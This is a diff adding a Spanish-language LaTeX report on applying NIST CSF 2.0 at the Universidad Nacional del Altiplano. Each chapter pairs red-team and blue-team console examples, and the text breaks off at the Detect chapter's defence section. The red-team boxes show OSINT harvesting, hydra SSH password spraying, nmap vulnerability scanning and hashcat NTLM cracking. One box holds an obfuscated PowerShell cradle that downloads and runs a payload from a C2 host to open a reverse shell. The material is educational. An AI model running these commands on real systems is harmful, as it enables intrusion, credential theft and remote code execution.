@@ -1,0 +1,705 @@
+% beautybook — decorative book class with coloured theorem boxes and a
+% two-tone chapter-heading treatment, adapted from the CTAN/GitHub
+% BeautyLaTeX/latex-template package.
+\documentclass[lang=en,12pt]{beautybook}
+\RequirePackage[utf8]{inputenc}
+\RequirePackage[spanish,es-tabla]{babel} % TRADUCCIÓN A ESPAÑOL
+\RequirePackage{times}
+\RequirePackage[T1]{fontenc}
+\RequirePackage{microtype}
+\RequirePackage[round]{natbib}
+\RequirePackage{longtable} % Para la matriz final
+
+\definecolor{coverbgcolor}{HTML}{e0e0e0}
+\definecolor{coverfgcolor}{HTML}{00205B} % Azul marino primario
+\definecolor{coverbar}{HTML}{4B6B99}
+\definecolor{bottomcolor}{HTML}{00133A}
+\definecolor{nuanbai}{HTML}{f5f5f5}
+\coverstyle={
+    cover-choose=en,
+}
+\mathstyle={
+    math-font=plain,
+}
+
+\mynewtheorem{
+    defi={\textbf{Definición}}[section]{interior style={left color=ReD!8,right color=ReD!5!CyaN!50}, borderline west={1.5mm}{0mm}{ReD}},
+    thm={\textbf{Teorema}}[section]{interior style={left color=CyaN!80!black!20,right color=CyaN!80!black!15!CyaN!50}, borderline west={1.5mm}{0mm}{CyaN!80!black}},
+    lem={\textbf{Lema}}[section]{interior style={left color=BluE!8,right color=BluE!5!CyaN!50}, borderline west={1.5mm}{0mm}{BluE}},
+    prop={\textbf{Proposición}}[section]{interior style={left color=OrangE!8,right color=OrangE!5!CyaN!50}, borderline west={1.5mm}{0mm}{OrangE}},
+    exam={\textbf{Ejemplo}}[chapter]{interior style={left color=DarkGreen!8,right color=DarkGreen!5!CyaN!50}, borderline west={1.5mm}{0mm}{DarkGreen}},
+}
+\newtheorem*{remark}{\textbf{Nota}}
+
+% CAJA DE CONSOLA ESTILO CMD / MINIMALISTA
+\newtcolorbox{cmdbox}[1]{
+    colback=black,
+    colframe=black!85,
+    coltext=white!95,
+    arc=0mm,
+    boxrule=0.5pt,
+    left=3mm,
+    right=3mm,
+    top=1mm,
+    bottom=1mm,
+    before skip=1em,
+    after skip=1.5em,
+    title={\texttt{>\_ \textbar\ \ #1}},
+    fonttitle=\ttfamily\small,
+    breakable
+}
+
+\begin{document}
+\thispagestyle{empty}
+\title{Cybersecurity Framework 2.0 en la UNAP}
+\subtitle{Análisis de Procesos de Ataque y Defensa}
+\edition{}
+\bookseries{}
+\author{QUISPE CHATA CARLOS DAVID}
+\pressname{UNAP}
+\presslogo{inner_pics/logo-universidad_files/Logo_UNAP_x7pS.png}
+\makecover
+
+\makeatletter
+\definecolor{bg}{HTML}{E6EEF5} % Azul claro para los fondos de secciones
+\definecolor{fg}{HTML}{00205B} % Azul marino (Color primario absoluto)
+\colorlet{outermarginbgcolor}{bg}
+\colorlet{outermarginfgcolor}{fg}
+\oddoutermargin{\sffamily \leftmark}
+\evenoutermargin{\sffamily\@title}
+\chapimage{inner_pics/beautybook-mark.png}
+\makeatother
+
+\colorlet{framegolden}{fg}
+\colorlet{framegray}{bg!50}
+
+\frontmatter
+\pagenumbering{Roman}
+
+\thispagestyle{empty}
+\tableofcontents\let\cleardoublepage\clearpage
+
+\mainmatter
+\pagenumbering{arabic}
+
+\partabstract{\hspace*{2em} Este informe desarrolla la implementación técnica, normativa y operativa del NIST Cybersecurity Framework (CSF) 2.0 en la Universidad Nacional del Altiplano, integrando metodologías defensivas y tácticas ofensivas.}
+\part*{El Ciclo de Ciberseguridad (CSF 2.0)}
+
+\chapter{Introducción a la Ciberseguridad en la UNAP}
+\label{ch:introduccion}
+
+La Universidad Nacional del Altiplano (UNAP) de Puno representa uno de los centros académicos y de investigación más críticos de la región sur del Perú. En su operación diaria, gestiona una infraestructura tecnológica compleja que da soporte a miles de estudiantes y docentes, incluyendo el Sistema Integrado de Información Académica, las aulas virtuales, sistemas financieros y redes de laboratorios.
+
+Debido a la gran cantidad de datos sensibles y propiedad intelectual que almacena, la UNAP se convierte en un objetivo de alto valor para cibercriminales. Las amenazas modernas exigen un enfoque estructurado y maduro. 
+
+\textbf{Niveles de Madurez (Implementation Tiers):}
+El NIST CSF 2.0 no es solo una lista de verificación, sino un modelo para medir la madurez organizacional en ciberseguridad a través de cuatro niveles (Tiers):
+\begin{itemize}
+    \item \textbf{Tier 1: Parcial (Informal).} La seguridad es reactiva y ad hoc.
+    \item \textbf{Tier 2: Informado por el Riesgo.} Existe conciencia del riesgo, pero no hay procesos institucionalizados.
+    \item \textbf{Tier 3: Repetible.} Procesos formales, actualizados regularmente y aplicados en toda la institución.
+    \item \textbf{Tier 4: Adaptativo.} Ciberseguridad ágil e integrada activamente en la estrategia global.
+\end{itemize}
+Actualmente, la infraestructura y procesos de la UNAP se sitúan entre los Tiers 1 y 2. El objetivo transversal de la aplicación de este framework es elevar la madurez institucional hacia un \textbf{Tier 3 (Repetible)}, estandarizando la defensa y la respuesta.
+
+\chapter{Gobernanza (Govern)}
+\label{ch:gobernanza}
+
+\section{Fundamento y Categorías NIST CSF 2.0}
+La \textbf{Gobernanza (Govern - GV)} es el pilar estratégico del framework NIST CSF 2.0. Constituye el puente entre los objetivos académicos de la Universidad Nacional del Altiplano (UNAP) y la ejecución técnica de la ciberseguridad. En esta fase, la alta dirección (Rectorado, Vicerrectorados y la Jefatura de la OTI) establece las directrices, el apetito de riesgo y el presupuesto para proteger la infraestructura universitaria, desde los laboratorios de investigación hasta los sistemas financieros. Sin una gobernanza sólida, los esfuerzos técnicos quedan desarticulados y carecen de respaldo legal e institucional.
+
+Las categorías oficiales implementadas para la UNAP son:
+\begin{itemize}
+    \item \textbf{GV.OC (Contexto Organizacional / Organizational Context):} Asegura que la estrategia cibernética comprenda el contexto de la UNAP, incluyendo el cumplimiento estricto de la Ley N° 29733 (Protección de Datos Personales) sobre los expedientes de estudiantes en el SIA.
+    \item \textbf{GV.RM (Estrategia de Gestión de Riesgos / Risk Management Strategy):} Define formalmente la tolerancia al riesgo de la universidad. Determina, por ejemplo, que la caída del campus virtual Moodle por 2 horas es un riesgo "aceptable", pero la alteración de notas en la base de datos es un riesgo "inaceptable".
+    \item \textbf{GV.SC (Gestión de Riesgos de la Cadena de Suministro / Cybersecurity Supply Chain Risk Management):} Exige la auditoría de terceros. Controla los riesgos introducidos por proveedores de software (ej. el proveedor del ERP financiero) o hardware externo adquirido para las facultades.
+\end{itemize}
+
+\section{Metodologías y Mecanismos de Defensa}
+Para estructurar la Gobernanza, la UNAP debe adoptar marcos de gestión formales:
+
+\textbf{1. ISO/IEC 27005 (Gestión de Riesgos de la Seguridad de la Información):} 
+Proporciona directrices para el proceso de apreciación del riesgo. La OTI debe catalogar todos los activos académicos (SIA, repositorios de tesis), evaluar sus vulnerabilidades y calcular el impacto cualitativo y cuantitativo (probabilidad $\times$ impacto) ante amenazas naturales o cibernéticas.
+
+\textbf{2. Marco de Control COBIT 2019 (Control Objectives for Information and Related Technologies):}
+Se implementa para alinear las metas de TI con las metas de la UNAP. Utilizando COBIT, se establece un Comité de Seguridad de la Información (CSI) multidisciplinario, asegurando que las decisiones de inversión en firewalls o licenciamiento de software no sean exclusivas del área técnica, sino que cuenten con el aval del vicerrectorado administrativo.
+
+\section{Vector de Ataque y Técnicas Ofensivas (Equipo Rojo (Red Team))}
+A nivel directivo y estratégico, los atacantes no explotan código, sino fallas en los procesos, acuerdos y políticas humanas. 
+\begin{itemize}
+    \item \textbf{Vectores MITRE ATT\&CK:} Se explota \textbf{T1195.002 (Supply Chain Compromise: Compromise Software Supply Chain)}, inyectando código malicioso en las actualizaciones de un proveedor de software local que la UNAP no auditó. Simultáneamente, se aprovecha \textbf{T1078.003 (Valid Accounts: Local Accounts)}, utilizando las credenciales de un ex-administrador de sistemas cuya cuenta nunca fue dada de baja debido a la falta de políticas de desvinculación laboral.
+\end{itemize}
+
+El Equipo Rojo (Red Team) simula este escenario recolectando cuentas huérfanas expuestas en brechas de terceros (OSINT (Inteligencia de Fuentes Abiertas / Open Source Intelligence)) y verificando su validez contra los servicios expuestos del rectorado.
+
+\begin{cmdbox}{Verificación de credenciales huérfanas (T1078) vía OSINT (Inteligencia de Fuentes Abiertas / Open Source Intelligence)}
+\begin{verbatim}
+root@kali-redteam:~# theHarvester -d unap.edu.pe \ 
+                     -b linkedin,hunter
+[*] Searching Linkedin...
+[*] Searching Hunter...
+[+] Found 45 emails and 12 exposed credentials in past breaches.
+root@kali-redteam:~# hydra -L exposed_users.txt -p 'Welcome2025' \
+                     ssh://192.168.10.5 -s 22
+[22][ssh] host: 192.168.10.5   login: jcarlos_exadmin \ 
+          password: Welcome2025
+[INFO] 1 valid password found. Insider threat vector active.
+\end{verbatim}
+\end{cmdbox}
+
+\section{Herramientas y Controles de Defensa (Equipo Azul (Blue Team))}
+El aseguramiento de la Gobernanza requiere herramientas de GRC (Gobernanza, Riesgo y Cumplimiento / Governance, Risk, and Compliance). La UNAP utiliza plataformas como \emph{Eramba} (Open Source) para centralizar las auditorías internas, el registro de riesgos y la validación de cumplimiento de políticas de la Ley de Protección de Datos.
+
+Adicionalmente, para mitigar las cuentas huérfanas, el Equipo Azul (Blue Team) automatiza auditorías de Directorio Activo, buscando cuentas inactivas por más de 90 días para su inhabilitación inmediata.
+
+\begin{cmdbox}{Defensa: Auditoría y Desactivación de Cuentas Huérfanas (PowerShell)}
+\begin{verbatim}
+PS C:\> Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 | 
+        Where-Object {$_.Enabled -eq $true} | \ 
+        Select-Object Name, LastLogonDate
+
+Name                 LastLogonDate
+----                 -------------
+jcarlos_exadmin      12/05/2025 10:15:22 AM
+mruiz_docente        01/08/2025 08:30:11 AM
+
+PS C:\> Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 | 
+        Disable-ADAccount -PassThru
+[OK] 2 Inactive accounts successfully disabled. \ 
+Governance policy enforced.
+\end{verbatim}
+\end{cmdbox}
+
+\section{Buenas Prácticas y KPIs para la UNAP}
+Para consolidar un gobierno cibernético de nivel Tier 3, se recomiendan las siguientes prácticas operativas:
+\begin{enumerate}
+    \item \textbf{Política de Offboarding Estricta:} Proceso automatizado donde Recursos Humanos notifica a la OTI el mismo día de la finalización del contrato de un docente o administrativo para revocar inmediatamente sus accesos lógicos y físicos.
+    \item \textbf{Auditoría de Proveedores (Riesgo de Terceros (Third-Party Risk)):} Exigir certificaciones de seguridad (ej. ISO 27001) a cualquier empresa proveedora de software o hardware antes de firmar contratos con la universidad.
+    \item \textbf{Programa de Concientización Obligatorio:} Implementar simulaciones de phishing y capacitaciones anuales obligatorias para todo el personal de la UNAP.
+\end{enumerate}
+
+\textbf{Indicadores Clave de Rendimiento (KPIs):}
+\begin{itemize}
+    \item \textbf{KPI 1: Tasa de Capacitación en Seguridad de la Información ($TC_{cap}$):} Mide el porcentaje del personal administrativo y docente que ha aprobado los exámenes de concientización. Meta: $> 90\%$.
+    \begin{equation}
+        TC_{cap} = \left( \frac{\text{Personal con Certificación Interna Aprobada}}{\text{Personal Total Activo de la UNAP}} \right) \times 100
+    \end{equation}
+
+    \item \textbf{KPI 2: Índice de Gestión de Riesgo de Proveedores ($IG_{rp}$):} Evalúa qué porcentaje de los proveedores tecnológicos críticos han pasado por una auditoría de seguridad formal en el último año.
+    \begin{equation}
+        IG_{rp} = \left( \frac{\text{Proveedores Críticos Auditados Anualmente}}{\text{Total de Proveedores Tecnológicos Críticos}} \right) \times 100
+    \end{equation}
+\end{itemize}
+
+\chapter{Identificación (Identify)}
+\label{ch:identify}
+
+\section{Fundamento y Categorías NIST CSF 2.0}
+La \textbf{Identificación (Identify - ID)} es la piedra angular técnica del framework. No se puede proteger lo que no se conoce. En una institución de la magnitud de la UNAP, la topología de red es vasta y cambiante: los docentes conectan sus propios portátiles (BYOD (Trae Tu Propio Dispositivo / Bring Your Own Device)), los laboratorios de ingeniería instalan software especializado, y existen bases de datos heredadas (legacy) conviviendo con servicios modernos en la nube. La función de Identificación garantiza una visibilidad absoluta del entorno.
+
+Se implementan las siguientes categorías del NIST CSF 2.0:
+\begin{itemize}
+    \item \textbf{ID.AM (Gestión de Activos / Asset Management):} Inventario de activos físicos y lógicos. Exige mantener una base de datos actualizada de todos los servidores de la UNAP, routers core, licencias de software y, críticamente, los flujos de datos (Mapeo de Flujo de Datos (Data Flow Mapping)) desde el estudiante hacia el SIA.
+    \item \textbf{ID.RA (Evaluación de Riesgos / Risk Assessment):} Valoración continua de vulnerabilidades. Implica escanear los sistemas descubiertos para identificar fallas de software (CVEs) antes de que sean explotadas.
+    \item \textbf{ID.IM (Mejora / Improvement):} Mejora continua mediante la integración de inteligencia de amenazas (Inteligencia de Amenazas (Threat Intelligence)) para identificar nuevos riesgos emergentes aplicables al sector educativo.
+\end{itemize}
+
+\section{Metodologías y Mecanismos de Defensa}
+Para asegurar un mapeo completo y seguro, la OTI debe aplicar metodologías de descubrimiento y análisis de arquitectura:
+
+\textbf{1. Modelado de Amenazas (STRIDE):}
+Propuesto por Microsoft, STRIDE evalúa la arquitectura de un software desde la etapa de diseño. La OTI aplica STRIDE al portal del SIA evaluando riesgos de \textit{Spoofing} (suplantación de identidad), \textit{Tampering} (manipulación de notas), \textit{Repudiation} (fraude sin rastro), \textit{Information Disclosure} (fuga de datos estudiantiles), \textit{Denial of Service} (caídas en matrícula) y \textit{Elevation of Privilege} (escalada a administrador).
+
+\textbf{2. Ciclo de Vida ITIL para la Gestión de Activos (ITAM):}
+Adoptando las mejores prácticas de ITIL v4, la universidad no solo registra una laptop cuando se compra, sino que gestiona su estado (Asignado, En Reparación, Decomisado), asegurando que los discos duros que contienen exámenes o información confidencial sean destruidos criptográficamente (Wipe) antes de ser dados de baja.
+
+\section{Vector de Ataque y Técnicas Ofensivas (Equipo Rojo (Red Team))}
+Durante la fase de reconocimiento, los cibercriminales intentan construir el mismo inventario que el equipo de seguridad, pero con el objetivo de encontrar la "puerta trasera" más débil.
+\begin{itemize}
+    \item \textbf{Vectores MITRE ATT\&CK:} Se ejecuta \textbf{T1595.001 (Active Scanning: Scanning IP Blocks)} para barrer los rangos de direcciones IP públicas asignadas a la UNAP. Se complementa con \textbf{T1592 (Gather Victim Host Information)}, donde el atacante inspecciona banners HTTP, versiones de SSH expuestas y bases de datos mal configuradas en los laboratorios de investigación.
+\end{itemize}
+
+El Equipo Rojo (Red Team) utiliza \emph{Nmap} con scripts de enumeración agresiva (\texttt{--script vuln}) para descubrir de manera automatizada activos no documentados o "Shadow IT" (servidores instalados por alumnos sin permiso de la OTI).
+
+\begin{cmdbox}{Descubrimiento y Escaneo de Vulnerabilidades (T1595) con Nmap}
+\begin{verbatim}
+root@kali-redteam:~# nmap -sV --script vuln 192.168.20.0/24 \ 
+                     -p 22,80,443,3306
+Starting Nmap 7.93 ( https://nmap.org ) at 2026-09-13
+Nmap scan report for lab-ciencias.unap.edu.pe (192.168.20.15)
+Host is up (0.0031s latency).
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+| vulners: 
+|   cpe:/a:apache:http_server:2.4.41: 
+|     CVE-2021-44790    9.8 \ 
+|       https://vulners.com/cve/CVE-2021-44790
+3306/tcp open  mysql   MySQL 5.7.35
+|_mysql-empty-password: Root account has empty password \ 
+  (VULNERABLE)
+\end{verbatim}
+\end{cmdbox}
+
+\section{Herramientas y Controles de Defensa (Equipo Azul (Blue Team))}
+El Equipo Azul (Blue Team) de la UNAP contrarresta el escaneo ciego mediante un inventario dinámico. Utilizan \emph{Snipe-IT} como base de datos de gestión de configuración (CMDB) para activos físicos, integrándolo con escáneres de red.
+
+Para cubrir la categoría ID.RA (Evaluación de Riesgos / Risk Assessment), la universidad ejecuta escaneos periódicos autenticados con \emph{Tenable Nessus} u \emph{OpenVAS}. Esto permite a los defensores adelantarse al atacante, descubriendo y parcheando las vulnerabilidades (como el MySQL sin clave mostrado por el Equipo Rojo (Red Team)) antes de que sean explotadas.
+
+\begin{cmdbox}{Defensa: Ejecución de escaneo de vulnerabilidades con OpenVAS CLI}
+\begin{verbatim}
+root@sec-scanner:~# gvm-cli socket --xml "<create_task>
+    <name>Auditoria Mensual UNAP - VLAN 20</name>
+    <target id='78b3-4f2a-b7cc-89de'/>
+    <scanner id='08b69003-5ce2-4037-a18d-2779'/>
+</create_task>"
+[OK] Task created successfully. ID: 12ab-34cd-56ef.
+root@sec-scanner:~# gvm-cli socket \ 
+           --xml \"<start_task task_id='12ab-34cd'/>\"
+[INFO] Scan started. Target: 192.168.20.0/24. Engine: OpenVAS.
+\end{verbatim}
+\end{cmdbox}
+
+\section{Buenas Prácticas y KPIs para la UNAP}
+Para madurar la función de Identificación hacia el nivel Tier 3 (Repetible), la OTI debe instituir:
+\begin{enumerate}
+    \item \textbf{Descubrimiento Automático de Activos:} Implementar sondas de red (sensores SPAN/Mirror) que detecten inmediatamente cuando un nuevo dispositivo se conecta a la red de la UNAP, evitando depender de hojas de Excel desactualizadas.
+    \item \textbf{Gestión de Parches Basada en Riesgo:} No todos los parches son urgentes. Priorizar la corrección de vulnerabilidades según su criticidad (CVSS $> 8.0$) y su exposición a internet, parchando primero los servidores web y luego las bases de datos internas.
+    \item \textbf{Clasificación de la Información:} Etiquetar los repositorios de datos en tres niveles: Público (Portal web), Uso Interno (Memos administrativos) y Confidencial (Planillas, Historiales académicos).
+\end{enumerate}
+
+\textbf{Indicadores Clave de Rendimiento (KPIs):}
+\begin{itemize}
+    \item \textbf{KPI 1: Cobertura de Inventario de Activos ($CI_a$):} Mide qué proporción del hardware operando en la red está formalmente registrado y auditado en la CMDB. Meta: $> 98\%$.
+    \begin{equation}
+        CI_a = \left( \frac{\text{Activos Detectados en Red que existen en la CMDB}}{\text{Total de Activos Detectados en la Red}} \right) \times 100
+    \end{equation}
+
+    \item \textbf{KPI 2: Tasa de Remediación de Vulnerabilidades Críticas ($TR_{vc}$):} Evalúa la agilidad del equipo de infraestructura para aplicar parches de seguridad críticos dentro de un SLA establecido (ej. 15 días).
+    \begin{equation}
+        TR_{vc} = \left( \frac{\text{Vulnerabilidades Críticas Parcheadas en } < 15 \text{ días}}{\text{Total de Vulnerabilidades Críticas Descubiertas}} \right) \times 100
+    \end{equation}
+\end{itemize}
+
+\chapter{Protección (Protect)}
+\label{ch:protect}
+
+\section{Fundamento y Categorías NIST CSF 2.0}
+La función de \textbf{Protección (Protect - PR)} constituye el núcleo preventivo del marco de ciberseguridad. Su propósito no es simplemente desplegar herramientas, sino establecer un conjunto cohesionado de controles, políticas y salvaguardas tecnológicas orientadas a garantizar la confidencialidad, integridad y disponibilidad (Tríada CIA) de los sistemas críticos. En el entorno de la Universidad Nacional del Altiplano (UNAP), donde la infraestructura debe equilibrar la apertura académica con la extrema seguridad de datos sensibles, esta etapa debe proteger desde los servidores del rectorado y las bases de datos de tesorería, hasta los portales académicos como el Sistema Integrado de Información Académica (SIA), Moodle institucional y las redes Wi-Fi distribuidas en las diversas facultades.
+
+Para dotar de rigor normativo a la estrategia, se adoptan las siguientes categorías oficiales del NIST CSF 2.0:
+\begin{itemize}
+    \item \textbf{PR.AA (Gestión de Identidades, Autenticación y Control de Acceso / Identity Management, Authentication, and Access Control):} Garantiza que las identidades y credenciales de estudiantes, docentes y personal administrativo sean gestionadas de forma centralizada (ej. mediante Microsoft Active Directory o FreeIPA), aplicando autenticación fuerte para el acceso a plataformas como el SIA o repositorios de investigación confidenciales.
+    \item \textbf{PR.DS (Seguridad de Datos / Data Security):} Abarca los controles criptográficos implementados para proteger la información en reposo y en tránsito. En la UNAP, esto exige el cifrado AES-256 de las bases de datos de matrículas y tesorería, y el uso estricto de TLS 1.3 en todas las comunicaciones web intra y extranet.
+    \item \textbf{PR.PS (Seguridad de la Plataforma / Platform Security):} Se enfoca en el "hardening" (endurecimiento o aseguramiento) de la infraestructura, lo que implica parchear vulnerabilidades y deshabilitar servicios innecesarios en los servidores físicos y máquinas virtuales que dan soporte a las aulas virtuales.
+\end{itemize}
+
+\section{Metodologías y Mecanismos de Defensa}
+Para aplicar la función de Protección de manera institucional, la Oficina de Tecnologías de la Información (OTI) de la UNAP debe regirse por dos metodologías fundamentales:
+
+\textbf{1. Defensa en Profundidad (Defense-in-Depth - DiD):} 
+Esta metodología militar aplicada a sistemas asume que cualquier control individual puede ser superado. En la UNAP, la implementación práctica de DiD requiere capas secuenciales:
+\begin{itemize}
+    \item \textit{Capa Perimetral:} Firewalls de Próxima Generación / Next-Generation Firewalls (NGFW) limitando el tráfico hacia el centro de datos universitario.
+    \item \textit{Capa de Red:} Segmentación estricta (VLANs), aislando la red Wi-Fi pública de estudiantes (VLAN 100) de la red privada de tesorería y recursos humanos (VLAN 200).
+    \item \textit{Capa de Endpoint y Datos:} Despliegue de soluciones EDR en las computadoras del personal administrativo y cifrado de las tablas relacionales de Moodle.
+\end{itemize}
+
+\textbf{2. Arquitectura de Confianza Cero / Zero Trust Architecture (ZTA):}
+Rompiendo con el paradigma tradicional de "confiar en todo lo que está dentro de la red", ZTA (alineado a NIST SP 800-207) exige la validación continua. Bajo esta metodología, el hecho de que un docente esté conectado físicamente a la red Ethernet de su facultad no le otorga acceso inherente a los servidores del rectorado. Cada petición de acceso al SIA es evaluada dinámicamente verificando la identidad, la postura de seguridad del dispositivo y los privilegios otorgados mediante Control de Acceso Basado en Roles / Role-Based Access Control (RBAC).
+
+\section{Vector de Ataque y Técnicas Ofensivas (Equipo Rojo (Red Team))}
+Las auditorías ofensivas (Red Teaming) validan la solidez de las salvaguardas de protección intentando vulnerar la gestión de identidades (PR.AA). 
+\begin{itemize}
+    \item \textbf{Vectores MITRE ATT\&CK:} El equipo ofensivo ejecuta \textbf{T1110.003 (Brute Force: Password Spraying)} para atacar portales web externos como el correo institucional o Moodle, buscando cuentas de docentes que utilicen contraseñas predecibles derivadas del nombre de la universidad o del año en curso. Posteriormente, en caso de compromiso interno, se ejecuta \textbf{T1003 (OS Credential Dumping)} para extraer el archivo NTDS.dit del controlador de dominio, exfiltrando todos los hashes criptográficos (NTLM) de la institución.
+\end{itemize}
+
+Para demostrar la técnica, los analistas extraen los hashes y utilizan herramientas de hardware acelerado (GPUs) junto con software como \emph{Hashcat} para romper la criptografía en tiempo récord.
+
+\begin{cmdbox}{Ataque de Fuerza Bruta y Craqueo (T1110) con Hashcat}
+\begin{verbatim}
+root@kali-redteam:~# hashcat -m 1000 -a 0 ntds_hashes.txt \ 
+                     dic_unap.txt -O
+hashcat (v6.2.5) starting...
+OpenCL API (OpenCL 2.0 pocl 1.8) - Platform #1 [pocl]
+=====================================================
+56b2707cdbe2cf44b6cbf8498f395669:admin1234
+f9c9c894236a287ce1dd427e1329c29c:SistemasUNAP2026
+8846f7eaee8fb117ad06bdd830b7586c:Puno2026!
+Session..........: hashcat
+Status...........: Cracked
+Speed.#1.........: 1200.5 MH/s (31.42ms)
+\end{verbatim}
+\end{cmdbox}
+
+\section{Herramientas y Controles de Defensa (Equipo Azul (Blue Team))}
+El equipo defensivo (Equipo Azul (Blue Team)) combate estas tácticas implementando controles técnicos avanzados. La UNAP centraliza la defensa de la identidad mediante el despliegue de políticas de contraseñas robustas aplicadas por \emph{Group Policy Objects (GPO)} y la imposición de Autenticación Multifactor (MFA) provista por soluciones como Cisco Duo o Azure AD (Microsoft Entra ID) para cualquier acceso VPN de docentes desde el exterior.
+
+A nivel de monitoreo activo de protección, se utiliza el agente \emph{Wazuh} desplegado en los servidores Linux y Windows del centro de datos, el cual alerta y bloquea intentos sistemáticos de fuerza bruta en tiempo real mediante su módulo de respuesta activa (Active Response).
+
+\begin{cmdbox}{Defensa: Regla de Bloqueo Wazuh frente a Password Spraying}
+\begin{verbatim}
+** Alert 1694635812.12456: - pam, syslog, authentication_failed
+2026 Sep 13 14:30:12 srv-sia-prod wazuh-agent: 
+Rule: 5712 (level 10) -> \ 
+'SSHD brute force trying to get access to the system.'
+Src IP: 190.234.12.56
+User: root
+--
+Action triggered: \ 
+active-response/bin/firewall-drop.sh add - 190.234.12.56 
+[INFO] Source IP 190.234.12.56 effectively dropped \ 
+by local iptables.
+\end{verbatim}
+\end{cmdbox}
+
+\section{Buenas Prácticas y KPIs para la UNAP}
+Para madurar desde un estado informal (Tier 1) hacia un estado Repetible (Tier 3), la OTI debe adoptar las siguientes prácticas:
+\begin{enumerate}
+    \item \textbf{Auditoría de Políticas de Contraseñas:} Alinear los requisitos de credenciales de la UNAP con los estándares del NIST SP 800-63B, eliminando las reglas obsoletas de "cambio de contraseña cada 90 días" a favor de exigir claves extensas (\emph{passphrases}) verificadas contra listas de contraseñas comprometidas (HaveIBeenPwned).
+    \item \textbf{Cifrado Total en Reposo:} Garantizar que los volúmenes de almacenamiento (LUNs) que soportan las bases de datos de tesorería y expedientes académicos de la UNAP estén protegidos nativamente por hardware o mediante LUKS/BitLocker.
+    \item \textbf{Segmentación Administrativa:} Establecer un entorno seguro dedicado (\emph{Jump Server} o Bastion Host) exclusivamente para que los administradores de red de la OTI realicen tareas de mantenimiento sobre los servidores, requiriendo MFA y grabando la sesión en video.
+\end{enumerate}
+
+\textbf{Indicadores Clave de Rendimiento (KPIs):}
+Para medir objetivamente el nivel de madurez en Protección, la UNAP deberá reportar semestralmente al comité de gobernanza los siguientes indicadores:
+
+\begin{itemize}
+    \item \textbf{KPI 1: Tasa de Cobertura de Autenticación Multifactor ($TC_{mfa}$):} Mide el avance en el despliegue de autenticación fuerte en la comunidad universitaria. Para ser Tier 3, este valor debe ser $> 95\%$.
+    \begin{equation}
+        TC_{mfa} = \left( \frac{\text{Usuarios Críticos y Docentes con MFA Activo}}{\text{Total de Usuarios Críticos y Docentes}} \right) \times 100
+    \end{equation}
+
+    \item \textbf{KPI 2: Tasa de Cumplimiento de Hardening de Servidores ($TC_{hs}$):} Evalúa qué porcentaje del centro de datos cumple con las guías de configuración segura (CIS Benchmarks) aplicables a sistemas operativos.
+    \begin{equation}
+        TC_{hs} = \left( \frac{\text{Servidores que cumplen } \geq 90\% \text{ de reglas CIS}}{\text{Total de Servidores en el Data Center}} \right) \times 100
+    \end{equation}
+\end{itemize}
+
+\cleardoublepage
+\chapter{Detección (Detect)}
+\label{ch:detect}
+
+\section{Fundamento y Categorías NIST CSF 2.0}
+La función de \textbf{Detección (Detect - DE)} parte de una premisa ineludible en la ciberseguridad moderna: la prevención (Protección) eventualmente fallará. La UNAP requiere la capacidad técnica para descubrir de forma temprana anomalías y eventos maliciosos que logren atravesar los firewalls perimetrales. Si un atacante vulnera la red de la biblioteca y comienza a moverse lateralmente hacia los servidores de la facultad de Ingeniería, la velocidad de detección dictará si el evento es un incidente menor o una catástrofe institucional.
+
+Las categorías oficiales integradas son:
+\begin{itemize}
+    \item \textbf{DE.CM (Monitoreo Continuo / Continuous Monitoring):} Obliga a la universidad a centralizar el registro continuo del tráfico de red, las peticiones DNS y los eventos de sistema (Windows Event Logs / Syslog) de todos los endpoints.
+    \item \textbf{DE.AE (Análisis de Eventos Adversos / Adverse Event Analysis):} Involucra el análisis automatizado y humano (triaje) para discriminar entre una alerta benigna (falso positivo) y un ataque real en curso.
+    \item \textbf{DE.DP (Procesos de Detección / Detection Processes):} Mantenimiento formal de las reglas de detección, asegurando que las alertas del SIEM se actualicen según las nuevas tácticas de ataque a nivel universitario.
+\end{itemize}
+
+\section{Metodologías y Mecanismos de Defensa}
+Para que la detección no se base puramente en firmas estáticas (antivirus tradicionales), la OTI debe implementar metodologías proactivas:
+
+\textbf{1. Cacería de Amenazas (Threat Hunting):} 
+Proceso iterativo liderado por humanos. Los analistas de seguridad de la UNAP no esperan a que salte una alerta en el panel de control; en su lugar, formulan hipótesis. Por ejemplo: "\textit{Si un atacante comprometió Moodle, podría estar usando túneles DNS para exfiltrar datos}". A partir de esta hipótesis, rastrean los logs manualmente buscando anomalías.
+
+\textbf{2. Análisis de Comportamiento de Usuarios y Entidades / User and Entity Behavior Analytics (UEBA):}
+Basado en Machine Learning, UEBA perfila el comportamiento base (baseline) de los usuarios. Si un perfil administrativo del SIA que normalmente opera de 8:00 a.m. a 4:00 p.m. desde una IP peruana, de pronto intenta descargar la base de datos completa de alumnos a las 2:00 a.m. desde Europa del Este, el sistema UEBA dispara una alerta de alta severidad por desviación de comportamiento, sin importar si la contraseña ingresada era correcta.
+
+\section{Vector de Ataque y Técnicas Ofensivas (Equipo Rojo (Red Team))}
+Un adversario avanzado busca evadir la detección ejecutando cargas útiles (payloads) sin descargar archivos al disco, residiendo únicamente en la memoria (Malware sin archivos (Fileless malware)).
+\begin{itemize}
+    \item \textbf{Vectores MITRE ATT\&CK:} Se ejecuta \textbf{T1059.001 (Command and Scripting Interpreter: PowerShell)}. El Equipo Rojo (Red Team) utiliza comandos de PowerShell ofuscados en Base64 para bypass de controles EDR y del Antivirus de Windows Defender.
+\end{itemize}
+
+Para simular este comportamiento evasivo y medir la capacidad de los sensores, se utiliza el framework \emph{Atomic Red Team}.
+
+\begin{cmdbox}{Simulación Evasiva con Atomic Red Team (T1059.001)}
+\begin{verbatim}
+PS C:\> $payload = "IEX (New-Object Net.WebClient).DownloadString('http://
+        c2-redteam.org/payload.ps1')"
+PS C:\> $bytes = [System.Text.Encoding]::\ 
+                 Unicode.GetBytes($payload)
+PS C:\> $encoded = [Convert]::ToBase64String($bytes)
+PS C:\> powershell.exe -ExecutionPolicy Bypass \ 
+        -WindowStyle Hidden -EncodedCommand $encoded
+
+[+] Payload executed in memory. \ 
+Establishing Reverse Shell to C2...
+\end{verbatim}
+\end{cmdbox}
+
+\section{Herramientas y Controles de Defensa (Equipo Azul (Blue Team))}
